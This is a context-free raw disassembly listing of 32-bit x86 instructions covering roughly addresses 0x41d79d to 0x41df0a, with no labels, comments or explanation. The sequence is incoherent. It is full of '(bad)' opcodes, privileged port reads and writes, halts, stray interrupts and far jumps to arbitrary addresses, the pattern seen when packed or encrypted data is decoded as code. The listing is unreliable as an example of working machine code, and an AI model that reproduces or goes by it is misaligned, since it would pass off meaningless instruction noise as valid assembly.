  41d79d:	ins    BYTE PTR es:[edi],dx
  41d79e:	adc    al,0x7c
  41d7a0:	shr    DWORD PTR [eax+0x3e],1
  41d7a3:	sbb    al,0xa0
  41d7a6:	sbb    al,0xbc
  41d7a8:	jae    0x41d74c
  41d7aa:	sahf   
  41d7ab:	push   edi
  41d7ac:	int    0xd0
  41d7ae:	dec    eax
  41d7af:	pop    es
  41d7b0:	pushf  
  41d7b1:	sub    DWORD PTR [edx-0x7fac9278],0x818b14a4
  41d7bb:	(bad)  
  41d7bc:	int    0x21
  41d7be:	mov    bh,0xa1
  41d7c0:	mov    bl,0xce
  41d7c2:	dec    ebx
  41d7c3:	cmp    DWORD PTR [eax+0x7697a629],edi
  41d7c9:	repnz dec esp
  41d7cb:	inc    ebx
  41d7cc:	dec    eax
  41d7cd:	adc    bl,dl
  41d7cf:	jmp    0x41d845
  41d7d1:	inc    ebx
  41d7d2:	mov    eax,DWORD PTR [edi+0x4b129830]
  41d7d8:	xchg   ebx,eax
  41d7d9:	cmp    dh,dl
  41d7db:	iret   
  41d7dc:	scas   eax,DWORD PTR es:[di]
  41d7de:	push   esi
  41d7df:	mov    BYTE PTR [eax+0x25],al
  41d7e2:	shl    BYTE PTR [ebx+edi*1+0x62],0xfa
  41d7e7:	jmp    0x3caa92a5
  41d7ec:	xor    DWORD PTR [edx+eiz*2+0x62396e0c],esi
  41d7f3:	cmp    eax,0x64d71ee
  41d7f8:	sub    BYTE PTR [ebp+0x49],0xab
  41d7fc:	mov    ds:0x185de028,al
  41d801:	pop    es
  41d802:	shl    bl,1
  41d804:	rcr    DWORD PTR [edi-0x3d],1
  41d807:	sub    ch,0xf7
  41d80a:	imul   esp,DWORD PTR [ebx-0x31bbc4a5],0x452e2e1b
  41d814:	ret    0xe66b
  41d817:	mov    DWORD PTR [edx+edi*1],edi
  41d81a:	arpl   WORD PTR [ebx+0x23],bp
  41d81d:	mov    al,ds:0x16d5eee1
  41d822:	push   cs
  41d823:	inc    esi
  41d824:	push   edx
  41d825:	push   ebp
  41d826:	sti    
  41d827:	fidiv  WORD PTR [edx-0x1a]
  41d82a:	mov    eax,0xf728908f
  41d82f:	and    DWORD PTR es:[eax],0x23
  41d833:	hlt    
  41d834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d835:	sbb    ch,BYTE PTR [edi-0xb86907c]
  41d83b:	mov    ds:0xc9e4d12d,al
  41d840:	gs push esi
  41d843:	push   0x422d37b3
  41d848:	mov    ch,0x79
  41d84a:	cld    
  41d84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d84c:	cmp    eax,0x642ed40c
  41d851:	in     eax,0x8f
  41d853:	pop    ebx
  41d854:	test   al,0x51
  41d856:	push   ss
  41d857:	and    eax,0xfbd24680
  41d85c:	mov    DWORD PTR [eax+0x7a],esp
  41d85f:	sub    al,0x99
  41d861:	loop   0x41d8bf
  41d863:	xchg   edi,eax
  41d864:	jne    0x41d850
  41d866:	push   ss
  41d867:	dec    ebp
  41d868:	dec    ebp
  41d869:	sub    DWORD PTR [esi+ebx*1],ebp
  41d86c:	jge    0x41d8b0
  41d86e:	dec    ebp
  41d86f:	pop    ebx
  41d870:	rol    edx,cl
  41d872:	test   BYTE PTR [eax+0x5],cl
  41d875:	cmp    edi,ebp
  41d877:	cmc    
  41d878:	xchg   edi,eax
  41d879:	mov    al,ds:0x9f2de72
  41d87e:	rcl    DWORD PTR [ecx+0x5d51374c],cl
  41d884:	jns    0x41d854
  41d886:	js     0x41d86c
  41d888:	scas   al,BYTE PTR es:[edi]
  41d889:	sbb    BYTE PTR [edx+0x9],dh
  41d88c:	stos   BYTE PTR es:[edi],al
  41d88d:	push   0xe
  41d88f:	mov    dl,0x10
  41d891:	(bad)  
  41d892:	fwait
  41d893:	pop    edx
  41d894:	fadd   QWORD PTR [eax+edx*1-0x2e]
  41d898:	adc    al,0x72
  41d89a:	fidiv  WORD PTR [eax-0x61]
  41d89d:	ja     0x41d869
  41d89f:	sbb    edx,eax
  41d8a1:	mov    edi,0x8f7cdae4
  41d8a6:	xchg   ebp,eax
  41d8a7:	jmp    0xd933744c
  41d8ac:	aaa    
  41d8ad:	jb     0x41d854
  41d8af:	cmp    BYTE PTR [ebx+ecx*1+0x4b],0xd6
  41d8b4:	in     al,dx
  41d8b5:	push   edi
  41d8b6:	ds mov dh,0x47
  41d8b9:	inc    esi
  41d8ba:	jne    0x41d881
  41d8bc:	sub    al,0x1f
  41d8be:	pop    es
  41d8bf:	jle    0x41d934
  41d8c1:	dec    ebx
  41d8c2:	(bad)  
  41d8c3:	cs fs js 0x41d909
  41d8c7:	fld    TBYTE PTR [eax-0x46]
  41d8ca:	push   ebp
  41d8cb:	or     BYTE PTR [eax],dh
  41d8cd:	sbb    eax,0xea634238
  41d8d2:	xor    cl,ch
  41d8d4:	(bad)  
  41d8d5:	dec    ebp
  41d8d6:	fldcw  WORD PTR [ebp+0x17]
  41d8d9:	pop    esi
  41d8da:	or     DWORD PTR [edx+0x4e],ebx
  41d8dd:	sbb    BYTE PTR [eax-0x32],al
  41d8e0:	pushf  
  41d8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8e2:	inc    esi
  41d8e3:	or     DWORD PTR [ebx-0x15],esp
  41d8e6:	lahf   
  41d8e7:	sub    BYTE PTR [eax],cl
  41d8e9:	mov    ah,0x32
  41d8eb:	push   esp
  41d8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ed:	lods   eax,DWORD PTR ds:[esi]
  41d8ee:	push   0x393e2704
  41d8f3:	mov    edx,0xe3d00bad
  41d8f8:	pushf  
  41d8f9:	test   al,0x24
  41d8fb:	es (bad) 
  41d8fe:	push   esp
  41d8ff:	and    eax,0xb378df2c
  41d904:	lock fcmovbe st,st(4)
  41d907:	sub    bl,BYTE PTR [ebx+0x1b0a25c4]
  41d90d:	call   DWORD PTR [ebx]
  41d90f:	dec    esp
  41d910:	xchg   BYTE PTR [edx],bh
  41d912:	aad    0x80
  41d914:	aaa    
  41d915:	jo     0x41d96f
  41d917:	icebp  
  41d918:	xor    dl,dh
  41d91a:	and    al,bh
  41d91c:	into   
  41d91d:	sub    eax,0x3405c680
  41d922:	mov    cl,0x8e
  41d924:	cmp    ah,BYTE PTR [edx]
  41d926:	jmp    0x41d9a5
  41d928:	dec    ecx
  41d929:	xchg   DWORD PTR [ebx+0x30],esi
  41d92c:	xor    dh,BYTE PTR [ebx]
  41d92e:	sbb    DWORD PTR [edi],0x61
  41d931:	mov    bl,0x57
  41d933:	icebp  
  41d934:	adc    eax,0xc89c8511
  41d939:	jmp    0xb4e1:0xe501e874
  41d940:	sar    ebx,cl
  41d942:	cmp    dh,ah
  41d944:	pop    esi
  41d945:	or     DWORD PTR [edx+0x6e],0x105c255
  41d94c:	jb     0x41d988
  41d94e:	fcmovu st,st(6)
  41d950:	hlt    
  41d951:	and    al,0x68
  41d953:	popa   
  41d954:	push   eax
  41d955:	ret    
  41d956:	pop    esp
  41d957:	mov    DWORD PTR [eax],edi
  41d959:	xchg   esi,eax
  41d95a:	loop   0x41d993
  41d95c:	sub    al,0xbd
  41d95e:	or     DWORD PTR [ecx],0x3e
  41d961:	sbb    edx,DWORD PTR [esi-0x4e17e76a]
  41d967:	dec    edx
  41d968:	in     al,dx
  41d969:	xchg   edx,eax
  41d96a:	lea    edi,[ebp+0x658cf3e9]
  41d970:	out    0x9f,eax
  41d972:	mov    ah,0xd
  41d974:	les    eax,FWORD PTR [esi+0x20]
  41d977:	stos   BYTE PTR es:[edi],al
  41d978:	imul   edi,eax,0x34
  41d97b:	das    
  41d97c:	xlat   BYTE PTR ds:[ebx]
  41d97d:	mov    DWORD PTR [edx+edx*1+0x4325a385],0x4e411ffb
  41d988:	test   BYTE PTR [ebx+0xe],al
  41d98b:	pop    esi
  41d98c:	dec    ecx
  41d98d:	xor    dl,BYTE PTR [edx-0x1f]
  41d990:	int    0x0
  41d992:	push   eax
  41d993:	cmc    
  41d994:	ins    BYTE PTR es:[edi],dx
  41d995:	sti    
  41d996:	jns    0x41d962
  41d998:	daa    
  41d999:	push   0xffffffd4
  41d99b:	mov    ?,WORD PTR [esi]
  41d99d:	add    DWORD PTR [ecx-0x4],esp
  41d9a0:	cmp    DWORD PTR [edi-0x34],edx
  41d9a3:	aad    0x7
  41d9a5:	mov    esp,0xdb37ffe5
  41d9aa:	int    0xa0
  41d9ac:	sahf   
  41d9ad:	fadd   st(3),st
  41d9af:	cli    
  41d9b0:	mov    eax,ds:0xfc70a5ad
  41d9b5:	loop   0x41d98b
  41d9b7:	xchg   ebp,eax
  41d9b8:	loop   0x41d9e9
  41d9ba:	sub    eax,0x7a26b274
  41d9bf:	jmp    0xc22c4949
  41d9c4:	shl    dh,1
  41d9c6:	cld    
  41d9c7:	or     eax,DWORD PTR [esi]
  41d9c9:	ret    0xae93
  41d9cc:	xchg   ebx,eax
  41d9cd:	pop    ds
  41d9ce:	and    BYTE PTR ds:0xf1b4e467,0x7d
  41d9d5:	daa    
  41d9d6:	mov    cl,0xca
  41d9d8:	stc    
  41d9d9:	add    eax,DWORD PTR ds:0xa4ef2052
  41d9df:	inc    ecx
  41d9e0:	push   ebp
  41d9e1:	dec    eax
  41d9e2:	retf   
  41d9e3:	bound  edi,QWORD PTR [ebp+0x324c5f25]
  41d9e9:	xchg   DWORD PTR [ecx+ebp*2+0x65],ecx
  41d9ed:	aaa    
  41d9ee:	and    eax,0x66c1943c
  41d9f3:	lods   eax,DWORD PTR ds:[esi]
  41d9f4:	rol    eax,0x4c
  41d9f7:	cmp    DWORD PTR [ecx+eax*1],ebx
  41d9fa:	ret    
  41d9fb:	nop
  41d9fc:	jmp    0x41d9dc
  41d9fe:	dec    ebp
  41d9ff:	lock and al,dh
  41da02:	out    0x1a,al
  41da04:	and    BYTE PTR [ebp-0x5e],dl
  41da07:	outs   dx,BYTE PTR ds:[esi]
  41da08:	cdq    
  41da09:	sbb    al,0xb9
  41da0b:	sbb    dh,BYTE PTR [esi+esi*1]
  41da0e:	cmp    BYTE PTR [edi],bh
  41da10:	and    al,0xb0
  41da12:	fst    QWORD PTR [ecx]
  41da14:	dec    ebp
  41da15:	mov    al,ds:0x7fe35352
  41da1a:	mov    al,ds:0x9d56dbb9
  41da1f:	xor    DWORD PTR [eax-0x3635394b],0xba3aee95
  41da29:	bound  ebx,QWORD PTR [esi]
  41da2b:	lea    ecx,[ebp-0x81a4d59]
  41da31:	jmp    0x41da53
  41da33:	sbb    DWORD PTR [ebp-0x42],eax
  41da36:	call   0x60195d5e
  41da3b:	push   edx
  41da3c:	add    eax,0x2f271806
  41da41:	aam    0x9e
  41da43:	sub    eax,0xd8ffa6d
  41da48:	ffree  st(3)
  41da4a:	outs   dx,BYTE PTR ds:[esi]
  41da4b:	push   ds
  41da4c:	cwde   
  41da4d:	mov    ecx,0x9ac692fa
  41da52:	fcomip st,st(6)
  41da54:	and    esp,DWORD PTR [ecx-0x7b]
  41da57:	and    esi,DWORD PTR [eax]
  41da59:	xchg   DWORD PTR [ebx],esp
  41da5b:	sub    al,0x7b
  41da5d:	mov    al,0xe0
  41da5f:	inc    ecx
  41da60:	sub    al,BYTE PTR [eax+0x1e]
  41da63:	jmp    0xaa2a:0xc2dc95db
  41da6a:	mov    edx,0x5a95793e
  41da6f:	cli    
  41da70:	sbb    dh,BYTE PTR [ebx+0x6f460c48]
  41da76:	mov    esp,0x191f5824
  41da7b:	int    0xa7
  41da7d:	cli    
  41da7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da7f:	jae    0x41da03
  41da81:	ds pop ss
  41da83:	inc    DWORD PTR [edi]
  41da85:	jmp    0x41daec
  41da87:	jns    0x41daa1
  41da89:	lock ja 0x41dabd
  41da8c:	mov    dl,0xd
  41da8e:	stos   DWORD PTR es:[edi],eax
  41da8f:	cwde   
  41da90:	push   eax
  41da91:	xchg   esp,eax
  41da92:	xor    bh,al
  41da94:	ins    BYTE PTR es:[edi],dx
  41da95:	in     al,dx
  41da96:	imul   ecx,DWORD PTR [edx+0x5c],0xffffffec
  41da9a:	jmp    0xab87863a
  41da9f:	push   ss
  41daa0:	out    0xee,eax
  41daa2:	jl     0x41da7c
  41daa4:	stos   DWORD PTR es:[edi],eax
  41daa5:	cmp    bh,BYTE PTR [esp+ebp*4]
  41daa8:	loope  0x41dafd
  41daaa:	add    BYTE PTR [ecx-0x33733f2f],al
  41dab0:	(bad)
  41dab4:	xor    BYTE PTR [edi],bl
  41dab6:	mov    esp,0x56bb8c7e
  41dabb:	stc    
  41dabc:	fstp   DWORD PTR [edx-0x72]
  41dabf:	ret    0x3a69
  41dac2:	cmp    DWORD PTR [ebp-0x3b710a69],ebx
  41dac8:	sub    bh,al
  41daca:	ret    0x64c3
  41dacd:	inc    ebp
  41dace:	xor    cl,BYTE PTR [eax-0x26]
  41dad1:	sti    
  41dad2:	mov    edx,0x77152d0b
  41dad7:	dec    ecx
  41dad8:	add    al,0xfa
  41dada:	loopne 0x41daf4
  41dadc:	adc    BYTE PTR [esi],bh
  41dade:	sub    al,0x97
  41dae0:	cwde   
  41dae1:	arpl   bp,dx
  41dae3:	mov    ah,0xdb
  41dae5:	(bad)  
  41dae6:	push   ecx
  41dae7:	outs   dx,BYTE PTR ds:[esi]
  41dae8:	and    BYTE PTR [edx],bl
  41daea:	mov    bh,BYTE PTR [eax+edi*1+0x45]
  41daee:	push   es
  41daef:	dec    esi
  41daf0:	(bad)  
  41daf1:	xchg   esp,eax
  41daf2:	or     eax,0xeed8d6a9
  41daf7:	mov    ds:0x54e9282f,al
  41dafc:	mov    ebp,0x8baae106
  41db01:	pop    esi
  41db02:	addr16 inc edi
  41db04:	outs   dx,BYTE PTR ds:[esi]
  41db05:	push   esp
  41db06:	sub    DWORD PTR [ebp-0x705ef2bd],edx
  41db0c:	jb     0x41db29
  41db0e:	pop    eax
  41db0f:	mov    ecx,0x339bf368
  41db14:	xchg   DWORD PTR [eax],edi
  41db16:	jae    0x41daa5
  41db18:	cmp    eax,0xea3dc768
  41db1d:	scas   eax,DWORD PTR es:[edi]
  41db1e:	loope  0x41db83
  41db20:	mov    ah,0xd4
  41db22:	cwde   
  41db23:	(bad)  
  41db24:	xor    al,0x39
  41db26:	aaa    
  41db27:	mov    ds:0xe1ba1be8,eax
  41db2c:	jns    0x41db83
  41db2e:	iret   
  41db2f:	mov    ebp,0x7bf51d27
  41db34:	mov    bh,0x94
  41db36:	add    eax,0xed01afc2
  41db3b:	sub    esp,ebp
  41db3d:	bound  ebx,QWORD PTR [edi+eax*8+0xa]
  41db41:	pusha  
  41db42:	add    BYTE PTR [esi+0x67],bh
  41db45:	out    0x84,eax
  41db47:	push   ebx
  41db48:	inc    ebx
  41db49:	rol    BYTE PTR [esi-0x64],0x1f
  41db4d:	xlat   BYTE PTR ds:[ebx]
  41db4e:	or     DWORD PTR [ecx],esi
  41db50:	in     al,dx
  41db51:	(bad)  
  41db52:	(bad)  
  41db53:	sbb    eax,0xa5368778
  41db58:	out    0x59,al
  41db5a:	push   es
  41db5b:	sbb    al,0x47
  41db5d:	xchg   ecx,eax
  41db5e:	jp     0x41daf8
  41db60:	jnp    0x41daf4
  41db62:	test   al,0x8f
  41db64:	scas   al,BYTE PTR es:[edi]
  41db65:	xor    DWORD PTR [ebx],edx
  41db67:	ret    
  41db68:	mov    bh,0x25
  41db6a:	in     eax,dx
  41db6b:	push   ss
  41db6c:	or     DWORD PTR [eax],eax
  41db6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db6f:	mov    esp,0x965feef9
  41db74:	dec    edi
  41db75:	pop    esi
  41db76:	or     eax,0x13425dcb
  41db7b:	add    DWORD PTR [edi],0xffffff8f
  41db7e:	repnz push ebp
  41db80:	mov    ebx,0x70d94b25
  41db85:	inc    ecx
  41db86:	scas   al,BYTE PTR es:[edi]
  41db87:	inc    ecx
  41db88:	(bad)  
  41db89:	jnp    0x41dbae
  41db8b:	inc    edx
  41db8c:	scas   eax,DWORD PTR es:[edi]
  41db8d:	shl    DWORD PTR [ebx-0x4d],cl
  41db90:	push   ebp
  41db91:	lock je 0x41db8a
  41db94:	jg     0x41dc04
  41db96:	cmp    eax,0xa73673e4
  41db9b:	stos   BYTE PTR es:[edi],al
  41db9c:	mov    edi,0x4d7f425a
  41dba1:	cmc    
  41dba2:	cmp    edx,DWORD PTR [ecx]
  41dba4:	add    cl,dl
  41dba6:	loop   0x41dbcf
  41dba8:	cmp    ecx,ebx
  41dbaa:	lock out 0x28,eax
  41dbad:	scas   eax,DWORD PTR es:[edi]
  41dbae:	not    dh
  41dbb0:	out    0x19,eax
  41dbb2:	xchg   ebp,eax
  41dbb3:	inc    esi
  41dbb4:	scas   eax,DWORD PTR es:[edi]
  41dbb5:	or     BYTE PTR [edi-0x6ec71d80],dl
  41dbbb:	mov    ?,WORD PTR [edx-0xb]
  41dbbe:	xor    ah,dl
  41dbc0:	ds inc esi
  41dbc2:	xor    ecx,DWORD PTR [bx+di+0x25]
  41dbc6:	xor    eax,0x46a12d7a
  41dbcb:	dec    esp
  41dbcc:	mov    edx,0x4bf7e5e4
  41dbd1:	out    dx,eax
  41dbd2:	cmp    esi,DWORD PTR [edx]
  41dbd4:	pop    edi
  41dbd5:	xor    DWORD PTR [edi-0x34451dc3],edx
  41dbdb:	pop    ds
  41dbdc:	sar    BYTE PTR [ebx-0x4328f40b],1
  41dbe2:	cld    
  41dbe3:	test   al,0x78
  41dbe5:	xor    edx,edx
  41dbe7:	iret   
  41dbe8:	stos   BYTE PTR es:[edi],al
  41dbe9:	add    dh,bl
  41dbeb:	xor    BYTE PTR [ebx],dl
  41dbed:	pop    ebp
  41dbee:	enter  0x737b,0xe5
  41dbf2:	add    eax,0x5c4aa6c4
  41dbf7:	xchg   esp,eax
  41dbf8:	shl    DWORD PTR [edi-0x779ed95a],0x69
  41dbff:	aas    
  41dc00:	sub    edi,DWORD PTR [edx]
  41dc02:	sbb    DWORD PTR [eax-0x6220e7ad],edx
  41dc08:	jg     0x41db8e
  41dc0a:	cmc    
  41dc0b:	fwait
  41dc0c:	shr    DWORD PTR ds:0xd1370b37,1
  41dc12:	mov    fs,ebx
  41dc14:	sub    al,0xa6
  41dc16:	rcl    ah,0x70
  41dc19:	sti    
  41dc1a:	leave  
  41dc1b:	(bad)  
  41dc1c:	fidivr DWORD PTR [edi-0x7d3e78c]
  41dc22:	(bad)
  41dc26:	fsubrp st(5),st
  41dc28:	mov    eax,ds:0xe662aa76
  41dc2d:	arpl   WORD PTR [ebp-0x6c4b4232],bp
  41dc33:	xchg   esi,eax
  41dc34:	xor    ecx,DWORD PTR [esp+esi*2]
  41dc37:	pop    eax
  41dc38:	icebp  
  41dc39:	test   ebp,esi
  41dc3b:	test   cl,dh
  41dc3d:	adc    ecx,DWORD PTR [eax+0x1f909baf]
  41dc43:	stos   DWORD PTR es:[edi],eax
  41dc44:	or     eax,DWORD PTR ds:0x3cee5729
  41dc4a:	mov    cl,0x5b
  41dc4c:	out    dx,al
  41dc4d:	iret   
  41dc4e:	or     DWORD PTR [ebp+0xbed92e4],0xfa78b33f
  41dc58:	jg     0x41dc32
  41dc5a:	xchg   ecx,eax
  41dc5b:	xchg   ebp,eax
  41dc5c:	pop    es
  41dc5d:	int    0x69
  41dc5f:	fsub   st(7),st
  41dc61:	(bad)  
  41dc63:	lods   al,BYTE PTR ds:[esi]
  41dc64:	ret    
  41dc65:	cmp    ah,0xdb
  41dc68:	scas   eax,DWORD PTR es:[edi]
  41dc69:	xor    BYTE PTR [ebx-0x36],0xa8
  41dc6d:	fisttp DWORD PTR [ebp-0x7bf1db89]
  41dc73:	xchg   ebx,eax
  41dc74:	mov    ebx,0xc880c06c
  41dc79:	mov    esi,0x8fcec5fd
  41dc7e:	pop    ss
  41dc7f:	scas   eax,DWORD PTR es:[edi]
  41dc80:	jo     0x41dcbe
  41dc82:	jl     0x41dc64
  41dc84:	mov    eax,0x3042663c
  41dc89:	sub    ecx,edi
  41dc8b:	call   0xd5905e47
  41dc90:	mov    al,ds:0x66919f7c
  41dc95:	pop    ds
  41dc96:	je     0x41dc19
  41dc98:	fldcw  WORD PTR [ebx-0xf]
  41dc9b:	or     al,0x18
  41dc9d:	les    eax,FWORD PTR [ebx-0x1d10767c]
  41dca3:	outs   dx,DWORD PTR ds:[esi]
  41dca4:	outs   dx,BYTE PTR ds:[esi]
  41dca5:	push   edx
  41dca6:	sub    al,0xc0
  41dca8:	sub    edx,DWORD PTR [ecx+0x63]
  41dcab:	cmp    BYTE PTR [eax-0x10],bl
  41dcae:	push   ebx
  41dcaf:	or     eax,esp
  41dcb1:	dec    ecx
  41dcb2:	sub    DWORD PTR [ebx-0x201ec107],ebp
  41dcb8:	mov    edx,0x68a242ef
  41dcbd:	xchg   edx,eax
  41dcbe:	mov    cl,0x70
  41dcc0:	mov    es,ebx
  41dcc2:	push   ecx
  41dcc3:	ret    
  41dcc4:	push   0x95d307c4
  41dcc9:	mov    esi,0x6915699e
  41dcce:	sub    dh,BYTE PTR [ecx+ecx*4+0x76]
  41dcd2:	pop    eax
  41dcd3:	adc    al,BYTE PTR [edi+0xa]
  41dcd6:	push   cs
  41dcd7:	mov    esp,0x3333ceab
  41dcdc:	iret   
  41dcdd:	mov    ebx,0xc71a952c
  41dce2:	jg     0x41dccf
  41dce4:	inc    edx
  41dce5:	jae    0x41dc97
  41dce7:	adc    esp,edi
  41dce9:	out    dx,al
  41dcea:	in     eax,dx
  41dceb:	das    
  41dcec:	sar    BYTE PTR [esi],0x68
  41dcef:	push   cs
  41dcf0:	mov    eax,0xe810c445
  41dcf5:	inc    esp
  41dcf6:	adc    DWORD PTR [edi-0x13a78587],ebp
  41dcfc:	(bad)  
  41dcfe:	mov    dl,0x58
  41dd00:	ret    
  41dd01:	xchg   edx,eax
  41dd02:	cmp    eax,0xcb4a141c
  41dd07:	aad    0x56
  41dd09:	pop    edi
  41dd0a:	pop    edx
  41dd0b:	mov    ds,esp
  41dd0d:	ror    al,1
  41dd0f:	xchg   ebx,eax
  41dd10:	ds adc DWORD PTR cs:[ecx-0x7e],0x2f0661c2
  41dd19:	or     ax,0x96fc
  41dd1d:	call   0x43ea0719
  41dd22:	arpl   WORD PTR [eax+0x38],ax
  41dd25:	adc    eax,0xeea54c60
  41dd2a:	hlt    
  41dd2b:	cmp    al,0x15
  41dd2d:	mov    al,0xb3
  41dd2f:	scas   al,BYTE PTR es:[edi]
  41dd30:	sahf   
  41dd31:	cwde   
  41dd32:	adc    DWORD PTR [ecx-0x7bdd65af],eax
  41dd38:	rcr    bh,cl
  41dd3a:	imul   ebx,DWORD PTR [ebx+0x781a09b5],0x73
  41dd41:	adc    esp,DWORD PTR fs:[esi-0x52]
  41dd45:	xchg   ebx,eax
  41dd46:	test   ah,dl
  41dd48:	jae    0x41dd73
  41dd4a:	stos   BYTE PTR es:[edi],al
  41dd4b:	pop    esi
  41dd4c:	test   BYTE PTR [edx+0x20],dh
  41dd4f:	jne    0x41dda7
  41dd51:	in     al,dx
  41dd52:	leave  
  41dd53:	push   0xa1de2718
  41dd58:	sar    DWORD PTR [esi],0x6b
  41dd5b:	sub    edx,edx
  41dd5d:	loope  0x41dd06
  41dd5f:	jae    0x41dd2f
  41dd61:	xchg   esp,eax
  41dd62:	stos   DWORD PTR es:[edi],eax
  41dd63:	xchg   DWORD PTR [ecx],ebx
  41dd65:	xor    al,0x3
  41dd67:	inc    ecx
  41dd68:	cmp    edx,DWORD PTR [ebp-0x29d6f38b]
  41dd6e:	test   cl,ah
  41dd70:	in     eax,dx
  41dd71:	sahf   
  41dd72:	xor    BYTE PTR [edx+0x1bea38e1],ch
  41dd78:	test   bh,bh
  41dd7a:	in     eax,dx
  41dd7b:	or     eax,0x806f7bde
  41dd80:	add    edi,DWORD PTR ds:0xa0aaee28
  41dd86:	or     BYTE PTR [ebx+0x35bb3d93],bh
  41dd8c:	cli    
  41dd8d:	mov    bl,0x2c
  41dd8f:	shl    DWORD PTR [ebx],cl
  41dd91:	mov    WORD PTR [eax],fs
  41dd93:	push   ds
  41dd94:	mov    ah,0x22
  41dd96:	inc    ecx
  41dd97:	stos   BYTE PTR es:[edi],al
  41dd98:	adc    BYTE PTR [edi],dh
  41dd9a:	mov    eax,0x192c3f8b
  41dd9f:	mov    DWORD PTR [ebp+0x79],esi
  41dda2:	xchg   ecx,eax
  41dda3:	loop   0x41dd48
  41dda5:	stos   BYTE PTR es:[edi],al
  41dda6:	fidiv  WORD PTR [ebx-0x2c]
  41dda9:	push   edi
  41ddaa:	sbb    al,0x22
  41ddac:	lock mov esp,0x397465ce
  41ddb2:	loop   0x41ddb8
  41ddb4:	sub    dh,BYTE PTR [esi+0x33e661e0]
  41ddba:	lahf   
  41ddbb:	or     WORD PTR [esi-0x43],0xffb3
  41ddc0:	xor    al,0xb7
  41ddc2:	int3   
  41ddc3:	sti    
  41ddc4:	js     0x41dd7e
  41ddc6:	outs   dx,BYTE PTR ds:[esi]
  41ddc7:	minps  xmm5,xmm4
  41ddca:	repnz std 
  41ddcc:	push   edx
  41ddcd:	shl    BYTE PTR [ebp+0x8da18c3],0x57
  41ddd4:	mov    dh,0xb3
  41ddd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddd7:	das    
  41ddd8:	imul   esp,DWORD PTR [ebx],0x77
  41dddb:	in     al,dx
  41dddc:	retf   
  41dddd:	into   
  41ddde:	sbb    eax,0xd8ce6815
  41dde3:	idiv   DWORD PTR [ecx-0x7b]
  41dde6:	add    DWORD PTR [eax-0x34],esi
  41dde9:	fcmovu st,st(3)
  41ddeb:	jbe    0x41de6c
  41dded:	cmp    BYTE PTR ds:0x345c4c51,dh
  41ddf3:	mov    esi,DWORD PTR [edx]
  41ddf5:	push   esp
  41ddf6:	fsub   QWORD PTR [ecx-0x1c]
  41ddf9:	xchg   bp,cx
  41ddfc:	rcr    DWORD PTR [esi-0x7d118da0],1
  41de02:	xchg   esp,eax
  41de03:	out    0x2f,eax
  41de05:	sbb    DWORD PTR [esi+ebp*4+0x6db3c0b8],esi
  41de0c:	sub    eax,0x12cad7c5
  41de11:	fidiv  WORD PTR [esi+0x114ecf84]
  41de17:	sbb    DWORD PTR [ebx+0x2d],eax
  41de1a:	enter  0xddc8,0x59
  41de1e:	mov    ds:0xd4cb0b7,al
  41de23:	fst    DWORD PTR [ecx]
  41de25:	xchg   edx,eax
  41de26:	test   eax,0x93e9009d
  41de2b:	cmp    eax,0x4fe6ea96
  41de30:	popa   
  41de31:	xchg   ecx,eax
  41de32:	ins    DWORD PTR es:[edi],dx
  41de33:	hlt    
  41de34:	mov    edi,0x13ba3f7
  41de39:	(bad)  
  41de3a:	sbb    ch,BYTE PTR [ecx]
  41de3c:	inc    eax
  41de3d:	in     al,dx
  41de3e:	and    BYTE PTR [edx+0x13c8a4c2],cl
  41de44:	pop    esp
  41de45:	xor    al,0xde
  41de47:	retf   
  41de48:	sbb    esi,esi
  41de4a:	cmp    BYTE PTR [ebx-0x54],0xc5
  41de4e:	add    al,0xf5
  41de50:	pop    edi
  41de51:	iret   
  41de52:	rol    DWORD PTR ds:0xc8fab86,1
  41de58:	pop    esp
  41de59:	xor    BYTE PTR [edx+0x55],ch
  41de5c:	call   0xc649:0xa3a3956f
  41de63:	mov    BYTE PTR [ecx-0x2b4ecb75],bl
  41de69:	xchg   ebx,eax
  41de6a:	int3   
  41de6b:	fimul  WORD PTR [ebx-0x23b92846]
  41de71:	out    dx,al
  41de72:	xchg   edx,eax
  41de73:	xor    bh,al
  41de75:	and    eax,0xf4f41a8a
  41de7a:	in     al,dx
  41de7b:	retf   
  41de7c:	jg     0x41deb1
  41de7e:	cmp    edi,esp
  41de80:	or     DWORD PTR [ebp-0x1bcef5f],eax
  41de86:	jmp    0x41de72
  41de88:	leave  
  41de89:	pop    edi
  41de8a:	mov    ebx,0x4974a2cc
  41de8f:	xlat   BYTE PTR ds:[ebx]
  41de90:	out    dx,al
  41de91:	add    ah,BYTE PTR ds:0x9c1f99d4
  41de97:	lock add al,0x49
  41de9a:	and    al,0x99
  41de9c:	add    cl,BYTE PTR [ebx]
  41de9e:	adc    edx,edx
  41dea0:	call   FWORD PTR [ebx]
  41dea2:	daa    
  41dea3:	clc    
  41dea4:	mov    ecx,0x3af6eeda
  41dea9:	adc    BYTE PTR [ebp+0x53],ah
  41deac:	push   ds
  41dead:	ja     0x41dee7
  41deaf:	add    bh,BYTE PTR [ecx+ebp*1-0x6cfdaf72]
  41deb6:	dec    ebp
  41deb7:	repnz cmc 
  41deb9:	les    edi,FWORD PTR [ebx-0x22]
  41debc:	movlps xmm2,QWORD PTR [ebp+ebx*2+0x39e8aeca]
  41dec4:	in     al,0x8e
  41dec6:	call   0xdd31:0x500eeb5e
  41decd:	les    edi,FWORD PTR [eax+0x69541616]
  41ded3:	lahf   
  41ded4:	push   ebx
  41ded5:	sti    
  41ded6:	jl     0x41df50
  41ded8:	mov    ah,0x73
  41deda:	jns    0x41df16
  41dedc:	in     eax,0x48
  41dede:	or     DWORD PTR [eax-0x6f52e427],edi
  41dee4:	cmp    al,0x45
  41dee6:	adc    BYTE PTR [edx+0x12d7f174],dl
  41deec:	mov    ds:0x414ae210,al
  41def1:	and    bh,BYTE PTR [ebx+0x21e9f135]
  41def7:	pop    ecx
  41def8:	jno    0x41dee3
  41defa:	xchg   dl,bl
  41defc:	add    BYTE PTR [ebp-0x6b8d6f3a],0x6a
  41df03:	test   eax,0xa39eb6b3
  41df08:	pop    ecx
  41df09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df0a:	jno    0x41df60
